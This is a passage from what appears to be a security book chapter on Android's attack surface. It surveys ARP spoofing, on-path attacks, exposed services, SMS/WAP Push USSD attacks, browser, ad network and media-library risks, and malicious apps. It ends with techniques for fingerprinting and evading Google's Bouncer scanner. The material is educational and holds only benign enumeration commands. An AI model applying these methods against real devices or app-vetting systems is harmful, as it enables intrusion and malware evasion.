(RPC)\nprotocols. Although protobufs appear to provide a presentation layer function,\nsuch communications regularly use HTTP transport. The lines between the\nlayers are blurry.\nThe protocols mentioned in this section play an integral role in modern\nInternet-connected devices. Android devices support and utilize all of the pro-\ntocols mentioned here in one way, shape, or form. Later sections discuss how\nthese protocols and the attack surfaces that correspond to them come into play.\nNetwork Confi gurations and Defenses\nToday’s Internet ecosystem is much different than it was in 1980s. In that time,\nthe Internet was mostly open. Hosts could freely connect to each other and users\nc05.indd 01:17:1:PM 02/24/2014 Page 136\nChapter 5 ■ Understanding Android’s Attack Surface 137\nwere generally considered trustworthy. In the late ‘80s and early ‘90s, network\nadministrators started noticing malicious users intruding into computer systems.\nIn light of the revelation that not all users could be trusted, fi rewalls were cre-\nated and erected to defend networks at their perimeter. Since then, host-based\nfi rewalls that protect a single machine from its network are sometimes used, too.\nFast-forward to 1999: Network Address Translation (NAT) was created to\nenable hosts within a network with private addresses to communicate with\nhosts on the open Internet. In 2013, the number of assignable IPv4 address\nblocks dwindled to an all-time low. NAT helps ease this pressure. For these\nreasons, NAT is commonplace in both home and cellular networks. It works\nby modifying addresses at the network layer. In short, the NAT router acts as\na transparent proxy between the wide area network (WAN) and the hosts on\nthe local area network (LAN). Connecting from the WAN to a host on the LAN\nrequires special confi guration on the NAT router. Without such a confi gura-\ntion, NAT routers act as a sort of fi rewall. As a result, NAT renders some attack\nsurfaces completely unreachable.\nAlthough they are both accessed wirelessly, mobile carrier networks differ\nfrom Wi-Fi networks in how they are provisioned, confi gured, and controlled.\nAccess to a given carrier’s network is tightly controlled, requiring that a Subscriber\nIdentity Module (SIM) card be purchased from that carrier. Carriers often meter\ndata usage, charging an amount per megabyte or gigabyte used. They also\nlimit what mobile devices can do on their network by confi guring the Access\nPoint Name (APN). For example, it is possible to disable interclient connections\nthrough the APN. As mentioned before, carriers make extensive use of NAT as\nwell. All of these things considered, carrier networks limit the exposed attack\nsurface even further than home networks. Keep in mind, though, that not all\ncarrier networks are the same. A less security-conscious carrier might expose\nall of its customers’ mobile devices directly to the Internet.\nAdjacency\nIn networking, adjacency refers to the relationship between nodes. For the pur-\nposes of this chapter, there are two relevant relationships. One is between\ndevices on a LAN. We call this relationship network adjacent or logically adjacent.\nThis is in contrast to being physically adjacent where an attacker is within a\ncertain physical proximity to her victim. An attacker can establish this type of\nrelationship by directly accessing the LAN, compromising other hosts on it, or\nby traversing a Virtual Private Network (VPN). The other relevant relationship\npertains to the privileged position of a router node. An attacker could establish\nthis position by subverting network routing or compromising a router or proxy\ntraversed by the victim. In doing so, the attacker is considered to be on-path. That\nis, they sit on the network path between a victim and the other remote nodes\nthey communicate with. Achieving more trusted positions can enable several\nc05.indd 01:17:1:PM 02/24/2014 Page 137\n138 Chapter 5 ■ Understanding Android’s Attack Surface\ntypes of attacks that are not possible otherwise. We’ll use these concepts later to\nexplicitly state whether certain attack surfaces are reachable and, if so, to what\nextent they are reachable.\nNetwork Adjacency\nBeing a neighbor on the same LAN as a target gives an attacker a privileged\nvantage point from which to conduct attacks. Typical LAN confi gurations leave\nthe network rather open, much like the Internet in the days of old. First and fore-\nmost, computers on a LAN are not behind any NAT and/or perimeter fi rewall.\nAlso, there is usually no router between nodes. Packets are not routed using\nIP. Instead they are broadcasted or delivered based on Media Access Control\n(MAC) addresses. Little to no protocol validation is done on host-to-host traffi c.\nSome LAN confi gurations even allow any node to monitor all communications\non the network. Although this is a powerful ability by itself, combining it with\nother tricks enables even more powerful attacks.\nThe fact that very little protocol validation takes place enables all sorts of\nspoofi ng attacks to succeed. In a spoofi ng attack, the attacker forges the source\naddress of his packets in an attempt to masquerade as another host. This makes\nit possible to take advantage of trust relationships or conceal the real source of\nattack. These types of attacks are diffi cult to conduct on the open Internet due\nto anti-spoofi ng packet fi lter rules and inherent latency. Most attacks of this\nkind operate at or above the network layer, but this is not a strict requirement.\nOne spoofi ng attack, called ARP spoofi ng or ARP cache poisoning, is carried\nout at layer 2. If successful, this attack lets an attacker convince a target node\nthat it is the gateway router. This effectively pivots the attacker from being a\nneighbor to being an on-path device. Attacks possible from this vantage point\nare discussed more in the next section. The most effective defense against ARP\nspoofi ng attacks involves using static ARP tables, something that is impossible\non unrooted mobile devices. Attacks against DNS are much easier because\nthe low latency associated with network adjacency means attackers can easily\nrespond faster than Internet-based hosts. Spoofi ng attacks against DHCP are\nalso quite effective for gaining more control over a target system.\nOn-Path Attacks\nOn-path attacks, which are commonly known as Man-in-the-Middle (MitM)\nattacks, are quite powerful. By achieving such a trusted position in the network,\nthe attacker can choose to block, alter, or forward any traffi c that fl ows through\nit. The attacker could eavesdrop on the traffi c and discover authentication cre-\ndentials, such as passwords or browser cookies, potentially even downgrading,\nstripping, or otherwise transparently monitoring encrypted communications.\nFrom such a trusted vantage point, an attacker could potentially affect a large\nnumber of users at once or selectively target a single user. Anyone that traverses\nthis network path is fair game.\nc05.indd 01:17:1:PM 02/24/2014 Page 138\nChapter 5 ■ Understanding Android’s Attack Surface 139\nOne way to leverage this type of position is to take advantage of inherent\ntrust relationships between a target and his favorite servers. Many software\nclients are very trusting of servers. Although attackers can host malicious serv-\ners that take advantage of this trust without being on-path, they would need to\npersuade victims to visit them. Being on-path means the attacker can pretend to\nbe any server to which the target user connects. For example, consider a target\nthat visits http://www.cnn.com/ each morning from his Android phone. An\non-path attacker could pretend to be CNN, deliver an exploit, and present the\noriginal CNN site content so that the victim is none the wiser. We’ll discuss the\nclient-side attack surface of Android in more detail in the “Client-side Attack\nSurface” section later in this chapter.\nThankfully, achieving such a privileged role on the Internet is a rather diffi cult\nproposition for most attackers. Methods to become an on-path attacker include\ncompromising routers or DNS servers, using lawful intercepts, manipulating\nhosts while network adjacent, and modifying global Internet routing tables.\nAnother method, which seems less diffi cult than the rest in practice, is hijack-\ning DNS via registrars. Another relatively easy way to get on-path is specifi c to\nwireless networks like Wi-Fi and cellular. On these networks, it is also possible\nto leverage physical proximity to manipulate radio communications or host a\nrogue access point or base station to which their target connects.\nNow that we’ve covered fundamental network concepts and how they relate\nto attacks and attackers, it’s time to dive deep into Android’s attack surface.\nUnderstanding these concepts is essential for knowing if a given attack surface\nis or is not reachable.\nNetworking Stacks\nThe holy grail of vulnerability research is a remote attack that has no victim\ninteraction requirements and yields full access to the system. In this attack\nscenario, an attacker typically only needs the ability to contact the target host\nover the Internet. An attack of this nature can be as simple as a single packet,\nbut may require lengthy and complex protocol negotiations. Widespread adop-\ntion of fi rewalls and NAT makes this attack surface much more diffi cult to\nreach. Thus, issues in the underlying code might be exposed only to network\nadjacent attackers.\nOn Android, the main attack surface that fi ts this description is the networking\nstack within the Linux kernel. This software stack implements protocols like IP,\nTCP, UDP, and ICMP. Its purpose is to maintain network state for the operating\nsystem, which it exposes to user-space software via the socket API. If an exploit-\nable buffer overfl ow existed in the processing of IPv4 or IPv6 packets, it would\ntruly represent the most signifi cant type of vulnerability possible. Successfully\nexploiting such an issue would yield remote arbitrary code execution in kernel-\nspace. There are very few issues of this nature, certainly none that have been\npublicly observed as targeting Android devices.\nc05.indd 01:17:1:PM 02/24/2014 Page 139\n140 Chapter 5 ■ Understanding Android’s Attack Surface\nNOTE Memory corruption vulnerabilities are certainly not the only type of issues\nthat aff ect the network stack. For example, protocol-level attacks like TCP sequence\nnumber prediction are attributed to this attack surface.\nUnfortunately, enumerating this attack surface further is largely a manual pro-\ncess. On a live device, the /proc/net directory can be particularly enlightening.\nMore specifi cally, the ptype entry in that directory provides a list of the protocol\ntypes that are supported along with their corresponding receive functions. The\nfollowing excerpt shows the contents on a Galaxy Nexus running Android 4.3.\nshell@maguro:/ $ cat /proc/net/ptype\nType Device Function\n0800 ip_rcv+0x0/0x430\n0011 llc_rcv+0x0/0x314\n0004 llc_rcv+0x0/0x314\n00f5 phonet_rcv+0x0/0x524\n0806 arp_rcv+0x0/0x144\n86dd ipv6_rcv+0x0/0x600\nshell@maguro:/ $\nFrom this output, you can see that this device’s kernel supports IPv4, IPv6,\ntwo types of LLC, PhoNet, and ARP. This, and more information, is available\nin the kernel’s build confi guration. Instructions for obtaining the kernel build\nconfi guration is provided in Chapter 10.\nExposed Network Services\nNetwork-facing services, which also don’t require victim interaction, are the\nsecond most attractive attack surface. Such services usually execute in user-\nspace, eliminating the possibility for kernel-space code execution. There is\nsome potential, although less so on Android, that successfully exploiting issues\nin this attack surface could yield root privileges. Regardless, exploiting issues\nexposed by this attack service allows an attacker to gain a foothold on a device.\nAdditional access can then be achieved via privilege escalation attacks, discussed\nlater in this chapter.\nUnfortunately though, most Android devices do not include any network\nservices by default. Exactly how much is exposed depends on the software\nrunning on the device. For example, in Chapter 10 we explain how to enable\nAndroid Debug Bridge (ADB) access via TCP/IP. In doing so, the device would\nlisten for connections on the network, exposing an additional attack surface that\nwould not be present otherwise. Android apps are another way that network\nservices could be exposed. Several apps listen for connections. Examples include\nthose that provide additional access to the device using the Virtual Network\nComputing (VNC), Remote Desktop (RDP), Secure Shell (SSH), or other protocols.\nc05.indd 01:17:1:PM 02/24/2014 Page 140\nChapter 5 ■ Understanding Android’s Attack Surface 141\nEnumerating this attack surface can be done in two ways. First, research-\ners can employ a port scanner such as Nmap to probe the device to see what,\nif anything, is listening. Using this method simultaneously tests device and\nnetwork confi guration. As such, the inability to fi nd listening services does\nnot mean a service is not listening. Second, they can list the listening ports of a\ntest device using shell access. The following shell session excerpt serves as an\nexample of this method:\nshell@maguro:/ $ netstat -an | grep LISTEN\ntcp6 0 0 :::1122 :::* LISTEN\nshell@maguro:/ $\nThe netstat command displays information from the tcp, tcp6, udp, and\nudp6 entries in the /proc/net directory. The output shows that something is\nlistening on port 1122. This is the exact port that we told the SSH Server app\nfrom ICE COLD APPS to start an SSH server on.\nAdditional network services also appear when the Portable Wi-Fi hotspot\nfeature is enabled. The following shows the output from the netstat command\nafter this feature was activated:\nshell@maguro:/ $ netstat -an\nProto Recv-Q Send-Q Local Address Foreign Address State\ntcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN\ntcp 0 0 192.168.43.1:53 0.0.0.0:* LISTEN\nudp 0 0 127.0.0.1:53 0.0.0.0:* CLOSE\nudp 0 0 192.168.43.1:53 0.0.0.0:* CLOSE\nudp 0 0 0.0.0.0:67 0.0.0.0:* CLOSE\nshell@maguro:/ $\nThe preceding example shows that a DNS server (TCP and UDP port 53) and\na DHCP server (UDP port 67) are exposed to the network. Hosting a hotspot\nsignifi cantly increases the attack surface of an Android device. If the hotspot\nis accessible by untrusted users, they could reach these endpoints and more.\nNOTE Retail devices often contain additional functionality that exposes more net-\nwork services. Samsung’s Kies and Motorola’s DLNA are just two examples introduced\nby original equipment manufacturer (OEM) modifi cations to Android.\nAs stated previously, network services are often unreachable due to the use\nof fi rewalls and NAT. In the case where an attacker is able to achieve network\nadjacency to a target Android device, these roadblocks go away. Further, there\nare known public methods for circumventing the fi rewall-like protections that\nNAT provides by using protocols like UPnP and NAT-PMP. These protocols can\nallow attackers to re-expose network services and therefore the attack surfaces\nthey expose.\nc05.indd 01:17:1:PM 02/24/2014 Page 141\n142 Chapter 5 ■ Understanding Android’s Attack Surface\nMobile Technologies\nSo far we have concentrated on attack surfaces that are common among all\nInternet-enabled devices. Mobile devices expose an additional remote attack\nsurface through cellular communications. That attack surface is the one exposed\nthrough Short Message Service (SMS) and Multimedia Messaging Service (MMS)\nmessages. These types of messages are sent from peer to peer, using the carri-\ners’ cellular networks as transit. Therefore, the SMS and MMS attack surfaces\nusually have no adjacency requirements and usually do not require any inter-\naction to reach.\nSeveral additional attack surfaces can be reached by using SMS and MMS\nmessages as an attack vector. For example, MMS messages can contain rich\nmultimedia content. Also, other protocols are implemented on top of SMS.\nWireless Application Protocol (WAP) is one such protocol. WAP supports push\nmessaging in addition to quite a few other protocols. Push messages are deliv-\nered to a device in an unsolicited manner. One type of request implemented as\na WAP Push message is the Service Loading (SL) request. This request allows\nthe subscriber to cause the handset to request a URL, sometimes without any\nuser interaction. This effectively serves as an attack vector that turns a client-\nside attack surface into a remote one.\nIn 2012, Ravi Borgaonkar demonstrated remote attacks against Samsung’s\nAndroid devices at EkoParty in Buenos Aires, Argentina. Specifi cally, he used\nSL messages to invoke Unstructured Supplementary Service Data (USSD) facili-\nties. USSD is intended to allow the carrier and GSM (Global System for Mobile\ncommunication) device to perform actions like refi lling and checking account\nbalances, voice mail notifi cations, and more. When the device received such an\nSL message, it opened the default browser without user interaction. When the\nbrowser loaded, it processed Ravi’s page containing several tel:// URLs. These\nURLs then caused the USSD code to be entered into the phone dialer automati-\ncally. At the time, many devices automatically processed these codes after they\nwere fully entered. Some devices (correctly) required the user to press the Send\nbutton after. A couple of particularly nasty USSD codes present in Samsung’s\ndevices were used to demonstrate the severity of the attack. The fi rst code was\nable to destroy a user’s SIM card by repeatedly attempting to change its Personal\nUnblocking Key (PUK). After ten failures the SIM would be permanently dis-\nabled, requiring the user to obtain a new one. The other code used was one that\ncaused an immediate factory reset of the handset. Neither operation required\nany user interaction. This serves as an especially impactful example of what is\npossible through SMS and protocols stacked on top of it.\nAdditional information about exercising the attack surface exposed by SMS\nis presented in Chapter 11.\nc05.indd 01:17:1:PM 02/24/2014 Page 142\nChapter 5 ■ Understanding Android’s Attack Surface 143\nClient-side Attack Surface\nAs previously mentioned, typical confi gurations on today’s networks mask\nmuch of the traditional remote attack surface. Also, many client applications\nare very trusting of servers they communicate with. In response to these facts,\nattackers have largely shifted to targeting issues present in the attack surface\npresented by client software. Information security professionals call this the\nclient-side attack surface.\nReaching these attack surfaces usually depends on potential victims initiating\nactions, such as visiting a website. However, some attack techniques can lift this\nrestriction. On-path attackers are able to easily remove this restriction in most\ncases by injecting their attack into normal traffi c. One example is a watering\nhole attack, which targets the users of a previously compromised popular site.\nDespite being tricky to reach, targeting the client-side attack surface allows\nattackers to set their crosshairs much more precisely. Attacks that use electronic\nmail vectors, for example, can be sent specifi cally to a target or group of targets.\nThrough source address examination or fi ngerprinting, on-path attackers can\nlimit to whom they deliver their attack. This is a powerful property of attacking\nthe client-side attack surface.\nAndroid devices are primarily designed to consume and present data. Therefore,\nthey expose very little direct remote attack surface. Instead, the vast majority\nof the attack surface is exposed through client applications. In fact, many client\napplications on Android initiate actions on the user’s behalf automatically. For\ninstance, e-mail and social networking clients routinely poll servers to see if\nanything new is available. When new items are found, they are processed in\norder to notify the user that they are ready for viewing. This is yet another way\nthat the client-side attack surface is exposed without the need for actual user\ninteraction. The remainder of this section discusses the various attack surfaces\nexposed by client applications on Android in more detail.\nBrowser Attack Surface\nThe modern web browser represents the most rich client-side application in\nexistence. It supports a plethora of web technologies as well as acts as a gateway\nto other technologies that an Android device supports. Supported World Wide\nWeb technologies range from simple HTML to wildly complex and rich applica-\ntions built upon myriad APIs exposed via JavaScript. In addition to rendering\nand executing application logic, browsers often support a range of underlying\nprotocols such as HTTP and FTP. All of these features are implemented by an\nabsolutely tremendous amount of code behind the scenes. Each of these com-\nponents, which are often embodied by third-party projects, represents an attack\nc05.indd 01:17:1:PM 02/24/2014 Page 143\n144 Chapter 5 ■ Understanding Android’s Attack Surface\nsurface in its own right. The rest of this section introduces the attack vectors\nand types of vulnerabilities to which browsers are susceptible and discusses\nthe attack surface within the browser engines commonly available on Android\ndevices.\nSuccessful attacks against web browsers can be accomplished several ways.\nThe most common method involves persuading a user to visit a URL that is\nunder the attacker’s control. This method is likely the most popular due to\nits versatility. An attacker can easily deliver a URL via e-mail, social media,\ninstant messaging, or other means. Another way is by inserting attack code\ninto compromised sites that intended victims will visit. This type of attack is\ncalled a “watering hole” or “drive-by” attack. Attackers in a privileged position,\nsuch as those that are on-path or logically adjacent, can inject attack content at\nwill. These types of attacks are often called Man-in-the-Middle (MitM) attacks.\nNo matter which vector is used to target the browser, the underlying types of\nvulnerabilities are perhaps more important.\nSecurely processing content from multiple untrusted sources within a single\napplication is challenging. Browsers attempt to segregate content on one site\nfrom accessing the content of another site by way of domains. This control\nmechanism has given rise to several entirely new types of vulnerabilities, such\nas cross-site scripting (XSS) and cross-site request forgery (CSRF or XSRF). Also,\nbrowsers process and render content from multiple different trust levels. This\nsituation has given birth to cross-zone attacks as well. For example, a website\nshould not be able to read arbitrary fi les from a victim’s computer system and\nreturn them to an attacker. However, zone elevation attacks discovered in the\npast have allowed just that. By no means is this a complete list of the types of\nvulnerabilities that affect browsers. An exhaustive discussion of such issues\nis far beyond the scope of this section. Several books, including “The Tangled\nWeb” and “The Browser Hacker’s Handbook,” focus entirely on web browser\nattacks and are recommended reading for a more in-depth exploration.\nUp until Android 4.1, devices shipped with only one browser: the Android\nBrowser (based on WebKit). With the release of the 2012 Nexus 7 and the Nexus\n4, Google started shipping Chrome for Android (based on Chromium) as the\ndefault browser. For a while, the Android browser was still available, too. In\ncurrent versions of vanilla Android, Chrome is the only browser presented to\nthe user. However, the traditional Android browser engine is still present and is\nused by apps discussed further in the “Web-Powered Apps” section later in this\nchapter. In Android 4.4, Google switched from using a pure-WebKit-supplied\nengine (libwebcore.so) to using an engine based on Chromium (libwebview-\nchromium.so).\nThe primary difference between Chrome for Android and the two other\nengines is that the Chrome for Android receives updates via Google Play. The\nWebKit- and Chromium-based engines, which are exposed to apps via the\nc05.indd 01:17:1:PM 02/24/2014 Page 144\nChapter 5 ■ Understanding Android’s Attack Surface 145\nAndroid Framework, are baked into the fi rmware and cannot be updated with-\nout a fi rmware upgrade. This drawback leaves these two engines exposed to\npublicly disclosed vulnerabilities, sometimes for a lengthy period of time. This\nis the “half-day vulnerability” risk fi rst mentioned in Chapter 1.\nEnumerating attack surfaces within a particular browser engine can be achieved\nin several ways. Each engine supports a slightly different set of features and thus\nexposes a slightly different attack surface. Because nearly all input is untrusted,\nalmost every browser feature constitutes an attack surface. An excellent starting\npoint is investigating the functionality specifi ed by standards documents. For\nexample, the HTML and SVG specifi cations discuss a variety of features that\ndeserve a closer look. Sites that track which features are implemented in each\nbrowser engine are priceless in this process. Also, the default browser engines\non Android systems are open source. Diving down the browser attack surface\nrabbit hole by digging into the code is also possible.\nDeeper attack surfaces lie beneath the various features supported by browsers.\nUnfortunately, enumerating these second-tier attack surfaces is largely a manual\nprocess. To simplify matters, researchers tend to further classify attack surfaces\nbased on certain traits. For example, some attack surfaces can be exercised\nwhen JavaScript is disabled whereas others cannot. Some functionality, such\nas Cascading Style Sheets (CSS), interact in complex ways with other technolo-\ngies. Another great example is Document Object Model (DOM) manipulation\nthrough JavaScript. Attacker supplied scripts can dynamically modify the\nstructure of the web page during or after load time. All in all, the complexity\nthat browsers bring leaves a lot of room for imagination when exploring the\nattack surfaces within.\nThe remainder of this book looks closer at fuzzing (Chapter 6), debugging\n(Chapter 7), and exploiting (Chapter 8 and Chapter 9) browsers on Android.\nWeb-Powered Mobile Apps\nThe vast majority of applications written for mobile devices are merely clients\nfor web-based back-end technologies. In the old days, developers created their\nown protocols on top of TCP or UDP to communicate between their clients and\nservers. These days, with the proliferation of standardized protocols, libraries,\nand middleware, virtually everything uses web-based technologies like web\nservices, XML RPC, and so on. Why write your own protocol when your mobile\napplication can make use of the existing web services API that your web front\nend uses? Therefore, most of the mobile applications for popular web-based\nservices (Zipcar, Yelp, Twitter, Dropbox, Hulu, Groupon, Kickstarter, and so\non) use this type of design.\nMobile developers often trust that the other side of the system is well behaved.\nThat is, clients expect servers to behave and servers expect clients are not malicious.\nc05.indd 01:17:1:PM 02/24/2014 Page 145\n146 Chapter 5 ■ Understanding Android’s Attack Surface\nUnfortunately, neither is necessarily the case. There are ways to increase the\ntrue level of trust between the client and the server, particularly to combat on-\npath or logically adjacent attackers. However, the server can never assume that\nthe client is entirely trusted. Further, the client should never assume that the\nserver it is talking to is a legitimate one. Instead, it should go to great lengths\nto authenticate that the server is indeed the correct one.\nMost of this authentication takes place through the use of SSL or TLS.\nTechniques like certifi cate pinning can even protect against rogue Certifi cate\nAuthorities (CAs). Because it is entirely up to the mobile application develop-\ners to properly utilize these technologies, many applications are insuffi ciently\nprotected. For example, a group of researchers from two German universities\nreleased a paper in 2008 entitled “Why Eve and Mallory Love Android: An\nAnalysis of Android SSL (In)Security.” The paper documented the researchers’\nfi ndings on the state of SSL verifi cation in Android apps. Their research found\nthat up to eight percent of all applications on the Google Play market that made\nuse of SSL libraries did so in such a way that easily allowed MitM attacks due\nto inadequately validated SSL/TLS certifi cates.\nOf course, the attack surface exposed by a web-powered mobile app varies from\none application to the next. One particularly dangerous example is a common\nTwitter client. Twitter is a web-based social media platform, but many clients\nexist in the form of Android apps. These apps often use WebViews (a building\nblock exposed by the Android Framework) to render the rich content that can\nbe included in a tweet. For example, most Twitter clients render images inline\nautomatically. This represents a signifi cant attack surface. A vulnerability in\nthe underlying image-parsing library could potentially compromise a device.\nFurther, users on Twitter often share links to other interesting web content.\nCurious users who follow the links could be susceptible to traditional browser\nattacks. Additionally, many Twitter clients subscribe to push messages (where\nthe server provides new data as it appears) or regularly poll (ask) the server for\nnew data. This design paradigm turns a client-side application into something\nthat could be remotely attacked without any user interaction.\nAd Networks\nAdvertising networks are a prominent part of the Android app ecosystem\nbecause they are often used by developers of ad-supported free mobile apps.\nIn these apps, a developer includes additional code libraries and invokes them\nto display ads as they deem necessary. Behind the scenes, the app developer\nhas an advertiser account and is credited based on various criteria, such as the\nnumber of ads displayed. This can be quite lucrative for apps that are extremely\npopular (for example, Angry Birds) so it is no surprise that app developers take\nthis route.\nc05.indd 01:17:1:PM 02/24/2014 Page 146\nChapter 5 ■ Understanding Android’s Attack Surface 147\nAdvertising networks represent an interesting and potentially dangerous piece\nof the puzzle for several reasons. The functionality that renders advertisements is\nusually based on an embedded browser engine (a WebView). As such, traditional\nbrowser attacks apply against these apps but typically only via the MitM vec-\ntors. Unlike traditional browsers, these WebViews often expose additional attack\nsurfaces that allow remote compromise using Java-style refl ection attacks. Ad\nnetwork frameworks are especially terrifying because legitimate advertisers\ncould also potentially take control of devices using these weaknesses. Although\nthese types of attacks are not covered further in this book, we recommend that\nyou read up on them by doing an Internet search for the terms “WebView,”\n“addJavascriptInterface,” and “Android Ad Networks.”\nIn addition to the risk of remote code execution, advertising frameworks also\npresent a signifi cant risk to privacy. Many frameworks have been found to be\ncollecting a plethora of personal information and reporting it back to the adver-\ntiser. This type of software is commonly referred to as adware and can become\na terrible nuisance to the end user. For example, an advertising framework that\ncollects the e-mail addresses of a user’s contacts could sell those to spammers who\nwould then bombard those addresses with unsolicited junk e-mails. Although\nthis is not as serious as fully compromising an Android device, it should not be\ntaken lightly. Sometimes compromising a user’s location or contacts is all that\nis necessary to achieve an attacker’s goals.\nMedia and Document Processing\nAndroid includes many extremely popular and well vetted open source librar-\nies, many of which are used to process rich media content. Libraries like libpng\nand libjpeg are prolifi c and used by almost everything that renders PNG and\nJPEG images, respectively. Android is no exception. These libraries represent\na signifi cant attack surface due to the amount of untrusted data processed by\nthem. As discussed previously, in the “Web-Powered Mobile Apps” section,\nTwitter clients often render images automatically. In this situation, an attack\nagainst one of these components might lead to a remote compromise without\nuser interaction. These libraries are well vetted, but that does not mean no issues\nremain. The past two years have seen the discovery of important issues in both\nof the aforementioned libraries.\nAdditionally, some OEM Android devices ship with document viewing and\nediting tools. For example, the Polaris Offi ce application shipped on the Samsung\nGalaxy S3 was leveraged to achieve remote code execution in the 2012 Mobile\nPwn2Own competition. The attack vector used in the competition was Near\nField Communication (NFC), which is discussed in the “NFC” section later in\nthis chapter.\nc05.indd 01:17:1:PM 02/24/2014 Page 147\n148 Chapter 5 ■ Understanding Android’s Attack Surface\nElectronic Mail\nAn electronic mail client is yet another client-side application that has an exposed\nattack surface. Like the other aforementioned client-side applications, electronic\nmail can be used as a vector to deliver browser attacks. In fact, Android e-mail\nclients are often based on a browser engine with a somewhat limited confi gura-\ntion. More specifi cally, e-mail clients do not support JavaScript or other scripted\ncontent. That said, modern e-mail clients render a subset of rich media, such\nas markup and images, inline. Also, e-mail messages can contain attachments,\nwhich have historically been a source of trouble on other platforms. Such attach-\nments could, for example, be used to exploit applications like Polaris Offi ce. The\ncode that implements these features is an interesting area for further research\nand seems to be relatively unexplored.\nGoogle Infrastructure\nAndroid devices, though powerful, rely on cloud-based services for much of\ntheir functionality. A large portion of the infrastructure behind these services\nis hosted by Google itself. The functionality provided by these services ranges\nfrom contact and e-mail data used by the phone dialer and Gmail to sophisti-\ncated remote management features. As such, these cloud services present an\ninteresting attack surface, albeit not one that is usually reachable by a typical\nattacker. Many of these services are authenticated by Google’s Single Sign On\n(SSO) system. Such a system lends itself to abuse because credentials stolen\nfrom one application could be used to access another application. This section\ndiscusses several relevant back-end infrastructure components and how they\ncan be used to remotely compromise an Android device.\nGoogle Play\nGoogle’s primary outlet for content, including Android applications, is Google\nPlay. It allows users to purchase music, movies, TV shows, books, magazines,\napps, and even Android-based devices themselves. Most content is download-\nable and is made available immediately on a chosen device. In early 2011, Google\nopened a website to access Google Play. In late 2013, Google added a remote\ndevice management component called Android Device Manager. The privileged\nand trusted role that Google Play serves makes it an interesting infrastructure\ncomponent to consider when thinking about attacking Android devices. In fact,\nc05.indd 01:17:1:PM 02/24/2014 Page 148\nChapter 5 ■ Understanding Android’s Attack Surface 149\nGoogle Play has been used in several attacks, which are covered more in the\nfollowing sections.\nMalicious Apps\nBecause much of the content within Google Play comes from untrusted sources, it\nrepresents another signifi cant remote attack surface. Perhaps the best example is\nan Android app. As is evident by now, Android apps contain code that executes\ndirectly on an Android device. Therefore, installing an application is equivalent\nto granting arbitrary code execution (albeit within Android’s user-level sandbox)\nto the app’s developer. Unfortunately, the sheer number of apps available for any\ngiven task overwhelms users and makes it very diffi cult for them to determine\nwhether they should trust a particular developer. If a user incorrectly assesses\ntrust, installing a malicious app could fully compromise her device. Beyond\nmaking incorrect trust decisions, attackers could also compromise a developer’s\nGoogle Play account and replace his application with malicious code. The mali-\ncious application would then be automatically installed on any device where the\ncurrent, safe version of the app is already installed. This represents a powerful\nattack that could be devastating to the Android ecosystem if carried out.\nOther content made available through Google Play might also be able to\ncompromise a device, but it’s not entirely clear where this content originates.\nWithout knowing that, it’s impossible to determine if there is an attack surface\nworth investigating.\nApart from the Google Play web application itself, which is outside the scope\nof this chapter, the Google Play application on an Android device exposes an\nattack surface. This app must process and render untrusted data that is sup-\nplied by developers. For example, the description of the application is one such\nsource of untrusted data. The underlying code beneath this attack surface is\none interesting place to look for bugs.\nThird-Party App Ecosystems\nGoogle allows Android users to install applications outside of Google Play. In\nthis way, Android is open to allowing independent third parties to distribute\ntheir applications from their company (or personal) websites. However, users\nmust explicitly authorize application installs from third parties by using the\nworkfl ow shown in Figure 5-3.\nc05.indd 01:17:1:PM 02/24/2014 Page 149\n150 Chapter 5 ■ Understanding Android’s Attack Surface\nFigure 5-3: Authorize unknown apps workflow\nThe ability to install third-party applications on Android devices has natu-\nrally led to the creation of third-party application ecosystems, which come with\ntheir own set of dangers. Perhaps the biggest threat posed by third-party app\nmarkets is one that carries over from pirated or cracked software on PCs and\nMacs: Trojans. Malicious actors will decompile code for a popular trusted app\nand modify it to do something malicious before posting it to the third-party\napp market. A 2012 study by Arxan Technologies entitled “State of Security in\nthe App Economy: ‘Mobile Apps Under Attack’” found that 100 percent (or all)\nof the applications listed on Google Play’s Top 100 Android Paid App list were\nhacked, modifi ed, and available for download on third-party distribution sites.\nThe report also provides some insights into the popularity (or pervasiveness) of\nthese sites, mentioning downloads of more than 500,000 for some of the more\npopular paid Android apps.\nIn Android 4.2, Google introduced a feature called Verify Apps. This feature\nworks through the use of fi ngerprinting and heuristics. It extracts heuristic data\nfrom applications and uses it to query a Google-run database that determines\nif the application is known malware or has potentially malicious attributes. In\nthis way, Verify Apps simulates a simple signature-based blacklisting system\nsimilar to that of antivirus systems. Verify Apps can issue warnings to the user\nor block installation entirely based on the classifi cation of attributes from the\napplication. Figure 5-4 shows this feature in action.\nc05.indd 01:17:1:PM 02/24/2014 Page 150\nChapter 5 ■ Understanding Android’s Attack Surface 151\nFigure 5-4: Verify Apps blocking and warning\nIn early 2013, the Android.Troj.mdk Trojan was found embedded in up to\n7,000 cracked Android applications available on third-party application sites.\nThis included some popular games such as Temple Run and Fishing Joy. This\nTrojan infected up to 1 million Chinese Android devices, making them part of\none of the biggest botnets known publicly at the time. This dwarfed the previ-\nously discovered Rootstrap Android botnet that infected more than 100,000\nAndroid devices in China. Obviously third-party app markets pose a clear\nand present danger to Android devices and should be avoided if possible. In\nfact, whenever possible, make sure that the Allow Installations from Unknown\nSources setting is disabled.\nBouncer\nIn an attempt to deal with malicious applications in Google Play, the Android\nSecurity Team runs a system called Bouncer. This system runs the applications\nthat developers upload inside a virtual environment to determine whether\nthe app exhibits malicious behavior. For all intents and purposes, Bouncer is\na dynamic runtime analysis tool. Bouncer is essentially an emulator based on\nc05.indd 01:17:1:PM 02/24/2014 Page 151\n152 Chapter 5 ■ Understanding Android’s Attack Surface\nQuick Emulator (QEMU), much like the one included in the Android SDK, to run\nAndroid and execute the app in question. To properly simulate the environment\nof a real mobile device, Bouncer emulates the common runtime environment\nfor an application, which means the app can access\n■ Address books\n■ Photo albums\n■ SMS messages\n■ Files\nAll of these are populated with dummy data unique to Bouncer’s emulated\nvirtual machine disk image. Bouncer also emulates common peripherals found\non mobile devices, such as a camera, accelerometer, GPS, and others. Furthermore,\nit allows the application to freely contact the Internet. Charlie Miller and Jon\nOberheide used a “reverse shell” application that gave them terminal-level access\nto Google’s Bouncer infrastructure via HTTP requests. Miller and Oberheide\nalso demonstrated a number of ways that Bouncer can be fi ngerprinted by a\nmalicious application. These techniques ranged from identifying the unique\ndummy data found in Bouncer’s SMS messages, address books, and photo\nalbums to detecting and uniquely fi ngerprinting the QEMU instance unique\nto the Bouncer virtual machines. These identifi cation techniques could then\nbe used by a malicious attacker to avoid executing the malicious 